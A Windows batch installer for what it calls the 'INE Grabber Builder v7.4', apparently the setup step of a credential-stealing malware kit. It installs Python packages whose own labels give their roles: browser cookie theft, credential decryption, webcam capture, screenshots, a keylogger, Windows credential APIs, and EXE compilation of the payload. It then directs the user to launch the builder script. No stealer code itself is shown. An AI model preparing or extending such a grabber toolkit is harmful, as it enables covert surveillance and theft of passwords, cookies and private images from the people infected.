@echo off
title INE Grabber Builder v7.4
echo ========================================
echo   INE Grabber Builder v7.4
echo ========================================
echo.

python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Python not found in PATH.
    echo Install Python 3.9+ from https://python.org
    echo Make sure to check "Add Python to PATH" during install.
    pause
    exit /b 1
)
echo [OK] Python detected:
python --version
echo.

echo Upgrading pip...
python -m pip install --upgrade pip --quiet
echo.

echo [ 1/10] customtkinter
python -m pip install customtkinter --quiet

echo [ 2/10] requests (+ urllib3, chardet, certifi, idna)
python -m pip install requests --quiet

echo [ 3/10] Pillow (PIL, icon conversion)
python -m pip install Pillow --quiet

echo [ 4/10] pyinstaller (EXE compilation)
python -m pip install pyinstaller --quiet

echo [ 5/10] browser-cookie3
python -m pip install browser-cookie3 --quiet

echo [ 6/10] cryptography (AES-GCM decryption)
python -m pip install cryptography --quiet

echo [ 7/10] opencv-python (webcam capture)
python -m pip install opencv-python --quiet

echo [ 8/10] mss (screenshot)
python -m pip install mss --quiet

echo [ 9/10] pynput (keylogger)
python -m pip install pynput --quiet

echo [10/10] pywin32 (win32crypt, win32cred, Windows APIs)
python -m pip install pywin32 --quiet

echo.
echo ========================================
echo   All dependencies installed!
echo   You can now launch the builder.
echo ========================================
echo.
echo Run: python INEGrabber.py
echo.
pause